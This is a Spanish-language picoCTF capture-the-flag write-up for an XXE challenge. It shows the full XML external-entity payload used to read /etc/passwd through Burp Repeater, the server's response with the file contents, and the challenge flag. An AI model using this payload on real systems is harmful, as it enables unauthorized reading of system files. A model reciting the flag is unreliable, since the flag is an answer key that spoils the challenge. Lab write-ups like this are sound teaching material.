## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:63655/)
## Solución
nos encontramos con una pagina que habla de computadoras y hay 3 recuadros con su boton de detalles sata un mensaje pero parece ser una simple descripción asique revisamos el código fuente
al ver que no hay algo que sirva nos dirigimos al burp para interceptar la pagina y nos dirigimos al apartado de https history y procedemos a revisar los detalles de cada recuatro para sacar los post.
![[Pasted image 20250930140009.png]]
como vemos que los post son iguales podemos hacer un ataque  XXE con el repeter del burp 
nos ubicamos a la ultima seccion del post y agregamos un comando de esta forma
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]> 
	<data>
		<ID>
		&xxe;
		</ID>
	</data>
```
esto nos dara como respuesta la lectura del archivo passwd 

```
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Tue, 30 Sep 2025 20:05:22 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1023
Connection: close

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```
## Referencias
XXE [Qué es XXE (XML External Entity) y cómo se soluciona - Hackmetrix Blog](https://blog.hackmetrix.com/xxe-xml-external-entity/)
